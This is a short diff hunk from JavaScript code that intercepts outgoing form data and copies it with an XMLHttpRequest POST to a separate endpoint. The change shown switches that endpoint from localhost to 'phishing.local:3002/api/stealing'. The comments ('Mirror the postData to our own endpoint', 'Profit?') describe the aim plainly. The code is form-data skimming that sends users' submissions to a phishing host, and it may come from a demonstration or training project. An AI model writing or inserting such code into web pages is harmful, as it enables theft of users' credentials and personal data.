@@ -16,7 +16,7 @@
       // 1: Mirror the postData to our own endpoint,
       // 2: Profit?
       var infoJackRequest = new XMLHttpRequest();
-      infoJackRequest.open("POST", "http://localhost:3002/api/stealing");
+      infoJackRequest.open("POST", "http://phishing.local:3002/api/stealing");
 
       // Send through to the original function with our
       // flag to prevent recursion
